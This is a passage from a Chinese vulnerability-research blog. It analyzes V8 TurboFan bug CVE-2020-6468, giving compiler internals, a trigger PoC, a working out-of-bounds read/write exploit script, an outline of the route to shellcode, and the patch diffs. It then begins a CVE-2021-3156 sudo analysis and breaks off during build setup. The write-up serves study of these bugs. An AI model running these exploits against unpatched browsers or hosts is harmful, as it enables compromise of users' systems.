<p>也就是说，<strong>重建控制流和效果流的这部分操作位于 <code>Scheduler</code> 类中</strong>。</p>
</li>
<li>
<p>而我们可以通过以下调用链，调用至 AddThrow 函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">void</span> <span class="title">EffectControlLinearizationPhase::Run</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    Schedule* <span class="title">Scheduler::ComputeSchedule</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">void</span> <span class="title">Scheduler::BuildCFG</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">void</span> <span class="title">CFGBuilder::Run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">          <span class="keyword">void</span> <span class="title">CFGBuilder::ConnectBlocks</span><span class="params">(Node* node)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">void</span> <span class="title">CFGBuilder::ConnectThrow</span><span class="params">(Node* thr)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">void</span> <span class="title">Schedule::AddThrow</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure>
<p>Scheduler 建立 CFG 时将会遍历控制结点（control node），如果遍历至 <code>IrOpcode::kThrow</code> 结点，则将会进行以下操作：</p>
<ol>
<li>
<p>获取 throw 结点的控制结点 throw_control</p>
</li>
<li>
<p>获取该控制结点的前驱(Predecessor)基础块 throw_block</p>
</li>
<li>
<p>设置 throw_block 的<strong>末尾控制流结点类型</strong>为 <code>BasicBlock::kThrow</code></p>
<blockquote>
<p>即设置<strong>末尾可终止该基本块的控制流结点</strong>的类型为 <code>BasicBlock::kThrow</code></p>
</blockquote>
</li>
<li>
<p>为 throw_block 基本块设置其<strong>控制流输入结点</strong>（control input）为当前 kThrow 结点。</p>
<blockquote>
<p>该 control input 应该是基本块的最后一个结点。</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>综上，若建立CFG时遍历到了 throw 控制流结点，则将</p>
<ol>
<li>获取 throw 控制流结点的前驱基本块</li>
<li>设置该基本块末尾的控制流结点类型以及控制流输入结点</li>
</ol>
<p>需要注意的是，基础块的控制流指向是<strong>从后往前</strong>的，因此 throw 控制流结点才会去处理前驱基础块末尾结点 （见第三个参考链接）</p>
</blockquote>
</li>
</ul>
<h3 id="2-关键点">2. 关键点</h3>
<ul>
<li>
<p><code>DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code>将会对 Terminate 结点进行处理，如果 Terminate 结点存在 Dead Input，则将其<strong>替换为 Throw 结点</strong>。<strong>由于 Terminate 结点并非实际控制流结点的一部分</strong>，因此这种替换成 Throw 结点的方式将会带来一些问题。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK(node-&gt;opcode() == IrOpcode::kDeoptimize ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kReturn ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kTerminate ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kTailCall);</span><br><span class="line">  Reduction reduction = PropagateDeadControl(node);</span><br><span class="line">  <span class="keyword">if</span> (reduction.Changed()) <span class="keyword">return</span> reduction;</span><br><span class="line">  <span class="comment">// 如果存在 DeadInput, 则将 Terminate 结点优化成 Throw 结点。</span></span><br><span class="line">  <span class="comment">// 因为存在DeadInput，所以 Terminate 结点将不会被执行到，一旦执行到肯定是出错了，即Throw</span></span><br><span class="line">  <span class="keyword">if</span> (FindDeadInput(node) != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    Node* effect = NodeProperties::GetEffectInput(node, <span class="number">0</span>);</span><br><span class="line">    Node* control = NodeProperties::GetControlInput(node, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;</span><br><span class="line">      effect = graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);</span><br><span class="line">      NodeProperties::SetType(effect, Type::None());</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;TrimInputCount(<span class="number">2</span>);</span><br><span class="line">    node-&gt;ReplaceInput(<span class="number">0</span>, effect);</span><br><span class="line">    node-&gt;ReplaceInput(<span class="number">1</span>, control);</span><br><span class="line">    NodeProperties::ChangeOp(node, common()-&gt;Throw());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>“Terminate 结点并非实际控制流结点”</strong>。这句话看上去有点难以理解，但实际上我们可以沿以下调用链，在<code>InstructionSelector::VisitNode</code>函数中找到答案：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">bool</span> <span class="title">PipelineImpl::SelectInstructions</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">InstructionSelectionPhase::Run</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">bool</span> <span class="title">InstructionSelector::SelectInstructions</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">void</span> <span class="title">InstructionSelector::VisitBlock</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">void</span> <span class="title">InstructionSelector::VisitNode</span><span class="params">(Node* node)</span></span></span><br></pre></td></tr></table></figure>
<p>在<code>VisitNode</code>函数中，IrOpcode中的<code>kStart</code>、<code>kLoop</code>，以及<code>kEffectPhi</code>、<code>kTerminate</code>等，都没有其对应的具体操作，即没有调用对应的 <code>VisitXXX</code> 函数。实际上，这些空操作的结点，在图中只是<strong>用于标识某些状态信息</strong>。以<code>kLoop</code>为例，该结点标识了一个循环的范围，但并不会实际翻译成对应的机器码。</p>
<p>以下是<code>VisitNode</code>函数的源码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstructionSelector::VisitNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  tick_counter_-&gt;DoTick();</span><br><span class="line">  DCHECK_NOT_NULL(schedule()-&gt;block(node));  <span class="comment">// should only use scheduled nodes.</span></span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kStart:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kLoop:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kEnd:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kBranch:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kIfTrue:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kIfFalse:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kIfSuccess:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kSwitch:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kIfValue:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kIfDefault:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kEffectPhi:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kMerge:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kTerminate:</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kBeginRegion:</span><br><span class="line">      <span class="comment">// No code needed for these graph artifacts.</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kFloat32Constant:</span><br><span class="line">      <span class="keyword">return</span> MarkAsFloat32(node), VisitConstant(node);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下是漏洞团队给出的 mini POC，该POC 可以触发 ReduceDeoptimizeOrReturnOrTerminateOrTailCall 函数，将 <code>Terminate</code> 结点优化成 <code>Throw</code>结点。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var obj = &#123;&#125;;</span><br><span class="line"><span class="function">function <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    var var13 = <span class="keyword">new</span> Int8Array(<span class="number">0</span>);</span><br><span class="line">    var13[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="function">async function <span class="title">var5</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> var9 = &#123;&#125;;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (abc1 | abc2)</span><br><span class="line">                <span class="keyword">while</span> (var9) &#123;</span><br><span class="line">                    await <span class="number">1</span>;</span><br><span class="line">                    print(abc3);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    var5();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(f());</span><br><span class="line">% PrepareFunctionForOptimization(f);</span><br><span class="line"><span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++)</span><br><span class="line">    f();</span><br><span class="line">% OptimizeFunctionOnNextCall(f);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<blockquote>
<p>注：图中的 <code>[INFO]</code> <code>[ERROR]</code> 等输出，均为手动打 patch 的输出。</p>
</blockquote>
<p><img src="/2021/02/CVE-2020-6468/terminate2throwInfo.png" alt="img"></p>
</li>
</ul>
<blockquote>
<p>这个 Poc 构造难度相当大，归根到底是因为 JIT 的优化机制复杂多变，常常出现上一个优化的结果跨过好几个Phase后，被某个位于角落的优化代码给处理了。</p>
<p>这个 Poc 仍然需要再细细研究一下。</p>
</blockquote>
<h2 id="四、漏洞利用">四、漏洞利用</h2>
<ul>
<li>
<p>当 Terminate 结点被替换成 Throw 结点后，在 turboFan EffectControlLinearizationPhase 中，部分指令将被错误地调度。如果我们可以在 <strong>checkmap 结点前向目标对象的特定位置写入 -1</strong>，那么就可以成功达到 type confusion 的目的。即，在目标函数<strong>认出</strong>当前对象非预期对象之前（check map），将 -1 写入对应位置。</p>
</li>
<li>
<p>以下是 issue中给出的越界读取 exp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classA</span> &#123;</span></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        <span class="keyword">this</span>.val = <span class="number">0x4242</span>;</span><br><span class="line">        <span class="keyword">this</span>.x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classB</span> &#123;</span></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        <span class="keyword">this</span>.val = <span class="number">0x4141</span>;</span><br><span class="line">        <span class="keyword">this</span>.x = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">this</span>.s = <span class="string">"dsa"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var A = <span class="keyword">new</span> classA();</span><br><span class="line">var B = <span class="keyword">new</span> classB()</span><br><span class="line"></span><br><span class="line">function f(arg1, arg2) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arg2 == <span class="number">41</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    var int8arr = <span class="keyword">new</span> Int8Array(<span class="number">10</span>);</span><br><span class="line">    var z = arg1.x;</span><br><span class="line">    <span class="comment">// new arr length</span></span><br><span class="line">    arg1.val = <span class="number">-1</span>;</span><br><span class="line">    int8arr[<span class="number">1500000000</span>] = <span class="number">22</span>;</span><br><span class="line">    <span class="function">async function <span class="title">f2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> nothing = &#123;&#125;;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//print("in loop");</span></span><br><span class="line">            <span class="keyword">if</span> (abc1 | abc2) &#123;</span><br><span class="line">                <span class="keyword">while</span> (nothing) &#123;</span><br><span class="line">                    await <span class="number">1</span>;</span><br><span class="line">                    print(abc3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = <span class="keyword">new</span> Array(<span class="number">10</span>);</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">var i;</span><br><span class="line"><span class="comment">// this may optimize and deopt, that's fine</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++) &#123;</span><br><span class="line">    f(A, <span class="number">0</span>);</span><br><span class="line">    f(B, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// this will optimize it and it won't deopt</span></span><br><span class="line"><span class="comment">// this loop needs to be less than the previous one</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    f(A, <span class="number">41</span>);</span><br><span class="line">    f(B, <span class="number">41</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(<span class="string">"change the arr length"</span>);</span><br><span class="line">f(arr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">print(<span class="string">"LENGTH: "</span> + arr.length.toString());</span><br><span class="line"></span><br><span class="line">print(<span class="string">"value at index 12: "</span> + arr[<span class="number">12</span>].toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">// crash</span></span><br><span class="line">print(<span class="string">"crash writing to offset 0x41414141"</span>);</span><br><span class="line">arr[<span class="number">0x41414141</span>] = <span class="number">1.1</span>;</span><br></pre></td></tr></table></figure>
<p>运行结果如下（注意使用 release 版本的 v8 ）：</p>
<p><img src="/2021/02/CVE-2020-6468/oob_exp.png" alt="img"></p>
<p>注意该 exp 中的关键点：函数 f 经过多次 opt 以及 deopt，搭配函数内部中错误的指令调度，导致当传入了一个非 A 非 B 类型的数组后，成功在数组长度位置处写入 -1。</p>
</li>
<li>
<p>当获取到越界读取原语后，我们就可以构建 ArrayBuffer 并覆写其 backing_store 指针，进而构造任意地址读写原语 =&gt; 写入 shellcode =&gt; 执行并获取 shell。这方面内容就不再过多展开了，感兴趣的可以查看之前那个 GoogleCTF2018 (Final) JIT WP，内含后续构造的详细构造。</p>
</li>
</ul>
<h2 id="五、后记">五、后记</h2>
<ul>
<li>
<p>漏洞修复见如下链接 - <a href="https://chromium.googlesource.com/v8/v8.git/+/2eb04d82cc353dd0b58bbffd21ee01d498ad506c%5E%21/#F0" target="_blank" rel="noopener">revision1</a> | <a href="https://chromium.googlesource.com/v8/v8.git/+/de2c0a3b2bf9922d72556a277ea2d5b648471fa6%5E%21/#F0" target="_blank" rel="noopener">revision2</a>。</p>
<p>新打的 patch 完成以下两操作：</p>
<ul>
<li>
<p>将 Terminate 的优化操作从 DeadCodeElimination 中移除</p>
<blockquote>
<p>因为 Terminate 结点并非实际控制流结点，因此不能转换成 Throw 结点。</p>
</blockquote>
</li>
<li>
<p>对 Schedule 类成员中 可选的DCHECK 修改成 强制的CHECK。</p>
<blockquote>
<p>Schedule 类成员函数对重建控制流起到了很重要的作用。在此处加强 check 将会降低重建异常控制流的可能性。</p>
</blockquote>
</li>
</ul>
<p>具体 diff 如下：</p>
<ul>
<li>
<p>revision1:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -317,7 +317,10 @@</span></span><br><span class="line">          node-&gt;opcode() == IrOpcode::kTailCall);</span><br><span class="line">   Reduction reduction = PropagateDeadControl(node);</span><br><span class="line">   if (reduction.Changed()) return reduction;</span><br><span class="line"><span class="deletion">-  if (FindDeadInput(node) != nullptr) &#123;</span></span><br><span class="line"><span class="addition">+  // Terminate nodes are not part of actual control flow, so they should never</span></span><br><span class="line"><span class="addition">+  // be replaced with Throw.</span></span><br><span class="line"><span class="addition">+  if (node-&gt;opcode() != IrOpcode::kTerminate &amp;&amp;</span></span><br><span class="line"><span class="addition">+      FindDeadInput(node) != nullptr) &#123;</span></span><br><span class="line">     Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">     Node* control = NodeProperties::GetControlInput(node, 0);</span><br><span class="line">     if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>revision2:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -218,7 +218,7 @@</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddGoto(BasicBlock* block, BasicBlock* succ) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   block-&gt;set_control(BasicBlock::kGoto);</span><br><span class="line">   AddSuccessor(block, succ);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">@@ -243,7 +243,7 @@</span></span><br><span class="line"> </span><br><span class="line"> void Schedule::AddCall(BasicBlock* block, Node* call, BasicBlock* success_block,</span><br><span class="line">                        BasicBlock* exception_block) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   DCHECK(IsPotentiallyThrowingCall(call-&gt;opcode()));</span><br><span class="line">   block-&gt;set_control(BasicBlock::kCall);</span><br><span class="line">   AddSuccessor(block, success_block);</span><br><span class="line"><span class="meta">@@ -253,7 +253,7 @@</span></span><br><span class="line"> </span><br><span class="line"> void Schedule::AddBranch(BasicBlock* block, Node* branch, BasicBlock* tblock,</span><br><span class="line">                          BasicBlock* fblock) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   DCHECK_EQ(IrOpcode::kBranch, branch-&gt;opcode());</span><br><span class="line">   block-&gt;set_control(BasicBlock::kBranch);</span><br><span class="line">   AddSuccessor(block, tblock);</span><br><span class="line"><span class="meta">@@ -263,7 +263,7 @@</span></span><br><span class="line"> </span><br><span class="line"> void Schedule::AddSwitch(BasicBlock* block, Node* sw, BasicBlock** succ_blocks,</span><br><span class="line">                          size_t succ_count) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   DCHECK_EQ(IrOpcode::kSwitch, sw-&gt;opcode());</span><br><span class="line">   block-&gt;set_control(BasicBlock::kSwitch);</span><br><span class="line">   for (size_t index = 0; index &lt; succ_count; ++index) &#123;</span><br><span class="line"><span class="meta">@@ -273,28 +273,28 @@</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddTailCall(BasicBlock* block, Node* input) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   block-&gt;set_control(BasicBlock::kTailCall);</span><br><span class="line">   SetControlInput(block, input);</span><br><span class="line">   if (block != end()) AddSuccessor(block, end());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddReturn(BasicBlock* block, Node* input) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   block-&gt;set_control(BasicBlock::kReturn);</span><br><span class="line">   SetControlInput(block, input);</span><br><span class="line">   if (block != end()) AddSuccessor(block, end());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddDeoptimize(BasicBlock* block, Node* input) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   block-&gt;set_control(BasicBlock::kDeoptimize);</span><br><span class="line">   SetControlInput(block, input);</span><br><span class="line">   if (block != end()) AddSuccessor(block, end());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddThrow(BasicBlock* block, Node* input) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line">   block-&gt;set_control(BasicBlock::kThrow);</span><br><span class="line">   SetControlInput(block, input);</span><br><span class="line">   if (block != end()) AddSuccessor(block, end());</span><br><span class="line"><span class="meta">@@ -302,8 +302,8 @@</span></span><br><span class="line"> </span><br><span class="line"> void Schedule::InsertBranch(BasicBlock* block, BasicBlock* end, Node* branch,</span><br><span class="line">                             BasicBlock* tblock, BasicBlock* fblock) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_NE(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, end-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_NE(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, end-&gt;control());</span></span><br><span class="line">   end-&gt;set_control(block-&gt;control());</span><br><span class="line">   block-&gt;set_control(BasicBlock::kBranch);</span><br><span class="line">   MoveSuccessors(block, end);</span><br><span class="line"><span class="meta">@@ -317,8 +317,8 @@</span></span><br><span class="line"> </span><br><span class="line"> void Schedule::InsertSwitch(BasicBlock* block, BasicBlock* end, Node* sw,</span><br><span class="line">                             BasicBlock** succ_blocks, size_t succ_count) &#123;</span><br><span class="line"><span class="deletion">-  DCHECK_NE(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="deletion">-  DCHECK_EQ(BasicBlock::kNone, end-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_NE(BasicBlock::kNone, block-&gt;control());</span></span><br><span class="line"><span class="addition">+  CHECK_EQ(BasicBlock::kNone, end-&gt;control());</span></span><br><span class="line">   end-&gt;set_control(block-&gt;control());</span><br><span class="line">   block-&gt;set_control(BasicBlock::kSwitch);</span><br><span class="line">   MoveSuccessors(block, end);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>一点点总结：</p>
<ul>
<li>调试 v8 JIT 相关的代码时，一定要让目标函数多运行几次，以建立起充足的 type feedback，这样就可以在调试上少走很多弯路。</li>
<li>熟练使用 GDB <code>call</code> / <code>p</code>指令，这样可以方便的通过对应类中内置的 Print 函数，直接在gdb中将 graph / node 打印输出，便于调试。</li>
</ul>
</li>
</ul>
<blockquote>
<p>实际上，对于这篇漏洞分析，笔者还是有点不太满意，因为受到技术水平的限制，实际要分析的 TypeConfusion 点并没有非常透彻的分析出来，因此这篇文章主体上还是侧重于介绍 JIT 中的一部分优化机制。</p>
</blockquote>
<h2 id="六、参考">六、参考</h2>
<ul>
<li>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1076708" target="_blank" rel="noopener">Issue 1076708: OOB read/write in v8::internal::ElementsAccessorBase&lt;v8::internal::FastHoleyDoubleElementsAccessor</a></p>
</li>
<li>
<p>TurboFan相关</p>
<ul>
<li>
<p><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/htmlpresent" target="_blank" rel="noopener">An overview of the TurboFan compiler</a></p>
</li>
<li>
<p><a href="https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.p" target="_blank" rel="noopener">Turbofan IR</a></p>
</li>
<li>
<p><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p" target="_blank" rel="noopener">TurboFan JIT Design</a></p>
</li>
<li>
<p><a href="https://stackoverflow.com/questions/57463700/meaning-of-merge-phi-effectphi-and-dead-in-v8-terminology" target="_blank" rel="noopener">Meaning of merge, phi, effectphi and dead in v8 terminology - stack overflow</a></p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>v8</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-3156分析</title>
    <url>/2021/01/CVE-2021-3156/</url>
    <content><![CDATA[<h2 id="一、前言">一、前言</h2>
<ul>
<li>
<p><code>sudo</code>是Linux中一个非常重要的管理权限的软件，它允许用户使用 root 权限来运行程序。而CVE-2021-3156是sudo中存在一个堆溢出漏洞。通过该漏洞，任何没有特权的用户均可使用默认的sudo配置获取root权限。</p>
</li>
<li>
<p>该漏洞可以影响从1.8.2~1.8.31p2下的所有旧版本sudo，以及1.9.0~1.9.5p1的所有稳定版sudo。</p>
<p>Qualys漏洞团队于<code>2021-01-13</code>联系 sudo 团队、<code>2021-01-26</code>正式披露。</p>
</li>
<li>
<p>由于这个漏洞原理<strong>较为简单</strong>，同时又涉及到<strong>提权</strong>这种高危操作，并且其影响广泛（笔者一台虚拟机、一个WSL以及一台阿里云服务器均可被攻击），相当有趣。所以我们接下来就来简单分析一下这个漏洞。</p>
<a id="more"></a>
</li>
</ul>
<h2 id="二、环境搭建">二、环境搭建</h2>
<ul>
<li>
<p>首先通过以下命令获取 sudo 的源代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get <span class="built_in">source</span> sudo</span><br></pre></td></tr></table></figure>
<p>由于获取源代码时，apt-get 提示可直接 git clone 该程序的仓库，因此我们就直接 clone 其仓库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://salsa.debian.org/debian/sudo.git</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>切换分支并编译 sudo，注意不要 install 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意此时的工作目录必须是git仓库的根目录</span></span><br><span class="line">  <span class="comment"># 以笔者为例，此时笔者的git仓库根目录为 /usr/class/myPoc/CVE-2021-3156/sudo</span></span><br><span class="line">  <span class="comment"># 此时笔者所使用的终端处于非root权限</span></span><br><span class="line"><span class="comment"># 切换分支。笔者切换到了最后一个漏洞版本</span></span><br><span class="line">git reset --hard 36955b3ef399efeea25824d32e6cfbaa444e9f07 <span class="comment"># v1.9.5p1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译， 这里设置了sudo查找sudo.conf、sudoers以及sodoers.so的路径。</span></span><br><span class="line"><span class="comment"># 原指令为 ./configure --sysconfdir=&lt;repo&gt;/examples --with-plugindir=&lt;repo&gt;/plugins/sudoers/.libs  &amp;&amp; make</span></span><br><span class="line">./configure --sysconfdir=/usr/class/myPoc/CVE-2021-3156/sudo/examples --with-plugindir=/usr/class/myPoc/CVE-2021-3156/sudo/plugins/sudoers/.libs/  &amp;&amp; make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要注意的是，sudo.conf、sodoers.so以及sudoers这三个文件的owner必须是root，否则会执行失败</span></span><br><span class="line">sudo chown root:root examples/sudo.conf</span><br><span class="line">sudo chown root:root examples/sudoers</span><br><span class="line">sudo chown root:root plugins/sudoers/.libs/sudoers.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换工作路径至sudo的二进制文件路径</span></span><br><span class="line"><span class="built_in">cd</span> src/.libs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动建立一个 sudoedit 链接</span></span><br><span class="line">sudo ln -s sudo sudoedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量，原指令为：export LD_LIBRARY_PATH="&lt;repo&gt;/lib/util/.libs"</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=/usr/class/myPoc/CVE-2021-3156/sudo/lib/util/.libs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置sudo权限</span></span><br><span class="line"><span class="comment"># sudo的权限设置比较特殊，按如下操作：</span></span><br><span class="line">sudo chown root:root ./sudo</span><br><span class="line">sudo chmod 4755 ./sudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在root权限下执行sudo以及sudoedit</span></span><br><span class="line">./sudo</span><br><span class="line">./sudoedit</span><br></pre></td></tr></table></figure>
